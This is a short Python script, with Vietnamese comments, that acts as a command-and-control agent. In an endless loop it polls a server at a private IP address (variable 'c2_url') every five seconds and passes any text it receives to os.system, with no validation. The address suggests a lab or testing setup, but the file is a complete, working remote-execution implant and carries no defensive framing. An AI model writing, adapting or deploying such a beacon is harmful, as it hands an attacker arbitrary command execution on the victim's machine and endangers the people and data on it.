import requests
import os
import time

c2_url = "http://192.168.159.137:5000/command"

while True:
    try:
        # Gửi yêu cầu GET đến server
        response = requests.get(c2_url, timeout=5)
        if response.status_code == 200:
            command = response.text.strip()
            print(f"Executing command: {command}")
            if command:
                os.system(command)  # Thực hiện lệnh
            else:
                print("No command received or invalid command")
        else:
            print(f"Server returned status code: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print("Error: Unable to connect to the server. Server might be down.")
    except requests.exceptions.Timeout:
        print("Error: Request to server timed out.")
    except Exception as e:
        print(f"Unexpected error: {e}")
    time.sleep(5)  # Hỏi lệnh mỗi 5 giây